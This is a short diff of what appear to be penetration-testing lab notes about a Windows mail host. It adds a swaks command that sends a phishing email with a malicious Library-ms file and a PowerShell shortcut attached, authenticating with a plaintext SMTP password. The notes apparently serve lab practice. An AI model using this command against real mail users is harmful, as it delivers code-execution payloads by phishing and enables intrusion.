@@ -101,3 +101,4 @@ Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows
 //249 web vuln upload
 // mark somewhere 
 ```
+sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @tools/config.Library-ms --attach @tools/powershell.lnk --server 192.168.218.189 --body @tools/body.txt --header "Subject: Staging Script" -au 'maildmz@relia.com' -ap 'DPuBT9tGCBrTbR'
